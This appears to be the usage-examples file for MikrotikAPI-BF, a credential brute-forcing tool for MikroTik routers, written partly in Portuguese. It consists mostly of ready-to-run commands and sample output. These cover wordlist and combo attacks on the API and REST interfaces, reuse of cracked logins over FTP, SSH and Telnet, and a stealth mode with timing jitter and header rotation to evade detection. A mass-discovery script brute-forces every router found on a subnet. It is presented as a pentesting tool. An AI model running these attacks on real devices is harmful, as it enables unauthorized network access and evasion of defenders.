# MikrotikAPI-BF v2.1 - Usage Examples (en-us)

## 📋 Índice

1. [Exemplos Básicos](#exemplos-básicos)
2. [Exemplos Avançados](#exemplos-avançados)
3. [Cenários de Pentesting](#cenários-de-pentesting)
4. [Configurações Específicas](#configurações-específicas)
5. [Troubleshooting](#troubleshooting)

## 🚀 Basic Examples

### 1. Single Credential Test

```bash
# Teste básico com usuário e senha únicos
python mikrotikapi-bf-v2.1.py -t 192.168.1.1 -U admin -P 123456
```

Expected output:
```
[INFO] Starting MikrotikAPI-BF v2.1
[INFO] Target: 192.168.1.1
[INFO] Testing credentials: admin:123456
[SUCCESS] [API] admin:123456
[SUCCESS] [REST] admin:123456
[INFO] Found 1 valid credential(s)
[INFO] Exporting results...
```

### 2. Wordlist Test

```bash
# Teste com wordlists de usuários e senhas
python mikrotikapi-bf-v2.1.py -t 192.168.1.1 -u wordlists/users.lst -p wordlists/passwords.lst
```

Wordlists structure:
```
# wordlists/users.lst
admin
user
manager
administrator
root

# wordlists/passwords.lst
123456
password
admin
12345
mikrotik
```

### 3. Combo File Test

```bash
# Teste com arquivo combo (user:pass)
python mikrotikapi-bf-v2.1.py -t 192.168.1.1 -d wordlists/combo.lst
```

Combo file format:
```
admin:123456
user:password
manager:admin
administrator:mikrotik
root:12345
```

### 4. Post-login Validation

```bash
# Teste com validação pós-login
python mikrotikapi-bf-v2.1.py -t 192.168.1.1 -u users.lst -p passwords.lst --validate ftp,ssh,telnet
```

Expected output:
```
[SUCCESS] [API] admin:123456
[SUCCESS] [REST] admin:123456
[VALIDATION] FTP login successful for admin:123456
[VALIDATION] SSH login successful for admin:123456
[VALIDATION] TELNET login successful for admin:123456
```

## 🔧 Advanced Examples

### 1. Stealth Mode

```bash
# Teste com stealth mode ativado
python mikrotikapi-bf-v2.1.py -t 192.168.1.1 -u users.lst -p passwords.lst --stealth --threads 1
```

Features:
- Fibonacci delays (1..55s)
- UA rotation and random headers
- Jitter

### 2. Fingerprinting

```bash
# Teste com fingerprinting do dispositivo
python mikrotikapi-bf-v2.1.py -t 192.168.1.1 --fingerprint
```

Sample output:
```
[FINGERPRINT] Target: 192.168.1.1
[FINGERPRINT] RouterOS Version: 7.8
[FINGERPRINT] Model: RB750
[FINGERPRINT] API Version: v1
[FINGERPRINT] Open Ports: 21, 22, 23, 80, 8728
[FINGERPRINT] Services: ftp, ssh, telnet, http, api
[FINGERPRINT] Risk Score: 7.5/10
[FINGERPRINT] Vulnerabilities: Exposed TELNET service
```

### 3. Progress Bar

```bash
# Teste com barra de progresso
python mikrotikapi-bf-v2.1.py -t 192.168.1.1 -u users.lst -p passwords.lst --progress
```

Sample output:
```
Progress: [████████████████████████████████████████] 100% (500/500)
ETA: 00:02:30 | Speed: 3.3 attempts/sec | Success: 2
```

### 4. Export

```bash
# Teste com exportação em todos os formatos
python mikrotikapi-bf-v2.1.py -t 192.168.1.1 -u users.lst -p passwords.lst --export-all
```

Generated files:
```
results/
├── mikrotik_192_168_1_1_20251005_123456.json
├── mikrotik_192_168_1_1_20251005_123456.csv
├── mikrotik_192_168_1_1_20251005_123456.xml
└── mikrotik_192_168_1_1_20251005_123456.txt
```

### 5. Proxy

```bash
# Teste com proxy SOCKS5
python mikrotikapi-bf-v2.1.py -t 192.168.1.1 -u users.lst -p passwords.lst --proxy socks5://127.0.0.1:1080

# Teste com proxy HTTP
python mikrotikapi-bf-v2.1.py -t 192.168.1.1 -u users.lst -p passwords.lst --proxy http://user:pass@proxy.example.com:8080
```

## 🎯 Pentesting Scenarios

### 1. Full Pentest Run

```bash
# Pentest completo com todos os recursos
python mikrotikapi-bf-v2.1.py \
  -t 192.168.1.1 \
  -u wordlists/users.lst \
  -p wordlists/passwords.lst \
  --validate ftp,ssh,telnet \
  --stealth \
  --fingerprint \
  --progress \
  --export-all \
  --threads 5 \
  -vv
```

### 2. Discovery (separate script if applicable)

```bash
# Descoberta de dispositivos Mikrotik na rede
python mikrotik-discovery.py --cidr 192.168.1.0/24 --threads 10 --export json
```

### 3. Persistent Session

```bash
# Criar nova sessão
python mikrotikapi-bf-v2.1.py -t 192.168.1.1 -u users.lst -p passwords.lst --force

# Continuar sessão existente
python mikrotikapi-bf-v2.1.py -t 192.168.1.1 --resume

# Listar sessões
python mikrotikapi-bf-v2.1.py --list-sessions

# Ver informações de sessão
python mikrotikapi-bf-v2.1.py -t 192.168.1.1 --session-info
```

### 4. Smart Wordlists

```bash
# Gerar wordlist inteligente baseada no target
python -c "
from _wordlists import SmartWordlistManager
wm = SmartWordlistManager()
target_info = {'model': 'RB750', 'version': '7.8'}
combinations = wm.generate_smart_combinations(target_info)
print(f'Generated {len(combinations)} combinations')
"
```

## ⚙️ Specific Configurations

### 1. Custom Ports

```bash
# Teste com portas customizadas
python mikrotikapi-bf-v2.1.py \
  -t 192.168.1.1 \
  -u users.lst \
  -p passwords.lst \
  --api-port 8728 \
  --http-port 8080 \
  --ssl \
  --ssl-port 8443 \
  --validate ftp=2121,ssh=2222,telnet=2323
```

### 2. Retry and Timeout

```bash
# Teste com configurações de retry
python mikrotikapi-bf-v2.1.py \
  -t 192.168.1.1 \
  -u users.lst \
  -p passwords.lst \
  --max-retries 3 \
  --timeout 10
```

### 3. Verbosity

```bash
# Teste com verbosidade normal
python mikrotikapi-bf-v2.1.py -t 192.168.1.1 -u users.lst -p passwords.lst

# Teste com verbosidade alta
python mikrotikapi-bf-v2.1.py -t 192.168.1.1 -u users.lst -p passwords.lst -v

# Teste com debug completo
python mikrotikapi-bf-v2.1.py -t 192.168.1.1 -u users.lst -p passwords.lst -vv
```

### 4. YAML Configuration

```yaml
# config.yaml
target: "192.168.1.1"
usernames: "wordlists/users.lst"
passwords: "wordlists/passwords.lst"
validate_services:
  ftp: 21
  ssh: 22
  telnet: 23
stealth_mode: true
fingerprint: true
progress: true
export_formats: ["json", "csv", "xml", "txt"]
threads: 5
verbose: true
```

```bash
# Usar configuração YAML
python mikrotikapi-bf-v2.1.py --config config.yaml
```

## 🔍 Sample Outputs

### 1. Successful Run

```
[INFO] Starting MikrotikAPI-BF v2.1
[INFO] Target: 192.168.1.1
[INFO] Loading wordlist: 25 combinations
[INFO] Starting brute force with 5 threads
[FINGERPRINT] Target: 192.168.1.1
[FINGERPRINT] RouterOS Version: 7.8
[FINGERPRINT] Model: RB750
[FINGERPRINT] Risk Score: 7.5/10
[SUCCESS] [API] admin:123456
[SUCCESS] [REST] admin:123456
[VALIDATION] FTP login successful for admin:123456
[VALIDATION] SSH login successful for admin:123456
[VALIDATION] TELNET login successful for admin:123456
[INFO] Found 1 valid credential(s)
[INFO] Exporting results to results/
[INFO] Session completed successfully
```

### 2. With Progress Bar

```
Progress: [████████████████████████████████████████] 100% (25/25)
ETA: 00:01:30 | Speed: 2.5 attempts/sec | Success: 1
[SUCCESS] [API] admin:123456
[SUCCESS] [REST] admin:123456
[VALIDATION] FTP login successful for admin:123456
[VALIDATION] SSH login successful for admin:123456
[VALIDATION] TELNET login successful for admin:123456
```

### 3. Debug Mode

```
[DEBUG] Trying -> admin:123456
[DEBUG] API connection successful
[DEBUG] REST API connection successful
[DEBUG] FTP validation successful
[DEBUG] SSH validation successful
[DEBUG] TELNET validation successful
[SUCCESS] [API] admin:123456
[SUCCESS] [REST] admin:123456
[VALIDATION] FTP login successful for admin:123456
[VALIDATION] SSH login successful for admin:123456
[VALIDATION] TELNET login successful for admin:123456
```

## 📊 Export Examples

### 1. JSON

```json
{
  "scan_info": {
    "target": "192.168.1.1",
    "timestamp": "2025-10-05T12:34:56.789012",
    "total_found": 1,
    "services_tested": ["api", "restapi", "ftp", "ssh", "telnet"]
  },
  "credentials": [
    {
      "user": "admin",
      "pass": "123456",
      "services": ["api", "restapi", "ftp", "ssh", "telnet"],
      "target": "192.168.1.1"
    }
  ]
}
```

### 2. CSV

```csv
username,password,services,target
admin,123456,"api, restapi, ftp, ssh, telnet",192.168.1.1
```

### 3. XML

```xml
<?xml version='1.0' encoding='utf-8'?>
<scan_results>
  <scan_info>
    <target>192.168.1.1</target>
    <timestamp>2025-10-05T12:34:56.789012</timestamp>
    <total_found>1</total_found>
  </scan_info>
  <credentials>
    <credential>
      <user>admin</user>
      <pass>123456</pass>
      <services>api, restapi, ftp, ssh, telnet</services>
      <target>192.168.1.1</target>
    </credential>
  </credentials>
</scan_results>
```

### 4. TXT

```
MikrotikAPI-BF v2.1 - Scan Results
=====================================
Target: 192.168.1.1
Timestamp: 2025-10-05T12:34:56.789012
Total Found: 1

Valid Credentials:
-----------------
Username: admin
Password: 123456
Services: api, restapi, ftp, ssh, telnet
Target: 192.168.1.1
```

## 🛠️ Troubleshooting

### 1. Issue: Connection timeout

```bash
# Verificar conectividade
ping 192.168.1.1

# Testar com timeout maior
python mikrotikapi-bf-v2.1.py -t 192.168.1.1 -U admin -P 123456 --timeout 30
```

### 2. Issue: Missing modules

```bash
# Verificar se está no diretório correto
pwd
ls -la _*.py

# Reinstalar dependências
pip install --force-reinstall -r requirements.txt
```

### 3. Issue: Permission denied

```bash
# Linux/macOS
chmod +x mikrotikapi-bf-v2.1.py

# Windows
# Executar PowerShell como Administrador
```

### 4. Issue: Encoding

```bash
# Definir encoding UTF-8
export PYTHONIOENCODING=utf-8

# Windows
set PYTHONIOENCODING=utf-8
```

### 5. Problema: Sessão Corrompida

```bash
# Limpar sessões antigas
rm -rf sessions/*.json

# Criar nova sessão
python mikrotikapi-bf-v2.1.py -t 192.168.1.1 -u users.lst -p passwords.lst --force
```

## 📚 Example Scripts

### 1. Script de Teste Automatizado

```bash
#!/bin/bash
# test_automation.sh

TARGET="192.168.1.1"
USERLIST="wordlists/users.lst"
PASSLIST="wordlists/passwords.lst"

echo "Starting automated test..."
python mikrotikapi-bf-v2.1.py \
  -t $TARGET \
  -u $USERLIST \
  -p $PASSLIST \
  --validate ftp,ssh,telnet \
  --stealth \
  --fingerprint \
  --progress \
  --export-all \
  --threads 5 \
  -vv

echo "Test completed. Check results/ directory."
```

### 2. Script de Descoberta em Massa

```bash
#!/bin/bash
# mass_discovery.sh

NETWORK="192.168.1.0/24"
USERLIST="wordlists/users.lst"
PASSLIST="wordlists/passwords.lst"

echo "Starting mass discovery..."
python mikrotik-discovery.py --cidr $NETWORK --threads 20 --export json

echo "Starting mass brute force..."
for ip in $(cat results/discovered_mikrotik_devices.json | jq -r '.devices[].ip'); do
  echo "Testing $ip..."
  python mikrotikapi-bf-v2.1.py \
    -t $ip \
    -u $USERLIST \
    -p $PASSLIST \
    --validate ftp,ssh,telnet \
    --stealth \
    --export-all
done

echo "Mass testing completed."
```

### 3. Script de Monitoramento

```bash
#!/bin/bash
# monitoring.sh

TARGET="192.168.1.1"
INTERVAL=300  # 5 minutes

while true; do
  echo "Testing $TARGET at $(date)"
  python mikrotikapi-bf-v2.1.py \
    -t $TARGET \
    -u wordlists/users.lst \
    -p wordlists/passwords.lst \
    --validate ftp,ssh,telnet \
    --stealth \
    --export-all
  
  echo "Waiting $INTERVAL seconds..."
  sleep $INTERVAL
done
```

## 🎯 Dicas de Uso

### 1. Otimização de Performance

```bash
# Usar threads adequadas (máximo 15)
python mikrotikapi-bf-v2.1.py -t 192.168.1.1 -u users.lst -p passwords.lst --threads 10

# Usar stealth mode para evitar detecção
python mikrotikapi-bf-v2.1.py -t 192.168.1.1 -u users.lst -p passwords.lst --stealth

# Usar sessões para continuidade
python mikrotikapi-bf-v2.1.py -t 192.168.1.1 -u users.lst -p passwords.lst --resume
```

### 2. Configuração de Wordlists

```bash
# Usar wordlists específicas para Mikrotik
python mikrotikapi-bf-v2.1.py -t 192.168.1.1 -u wordlists/mikrotik_users.lst -p wordlists/mikrotik_passwords.lst

# Usar wordlists brasileiras
python mikrotikapi-bf-v2.1.py -t 192.168.1.1 -u wordlists/username_br.lst -p wordlists/labs_passwords.lst
```

### 3. Configuração de Exportação

```bash
# Exportar apenas JSON
python mikrotikapi-bf-v2.1.py -t 192.168.1.1 -u users.lst -p passwords.lst --export json

# Exportar para diretório específico
python mikrotikapi-bf-v2.1.py -t 192.168.1.1 -u users.lst -p passwords.lst --export-all --export-dir reports/
```

### 4. Configuração de Validação

```bash
# Validar apenas FTP
python mikrotikapi-bf-v2.1.py -t 192.168.1.1 -u users.lst -p passwords.lst --validate ftp

# Validar com portas customizadas
python mikrotikapi-bf-v2.1.py -t 192.168.1.1 -u users.lst -p passwords.lst --validate ftp=2121,ssh=2222
```

## 📞 Suporte

Para mais exemplos e suporte:

- **GitHub**: https://github.com/mrhenrike/MikrotikAPI-BF
- **Documentação**: `docs/README.md`
- **Issues**: GitHub Issues
- **LinkedIn**: https://www.linkedin.com/in/mrhenrike
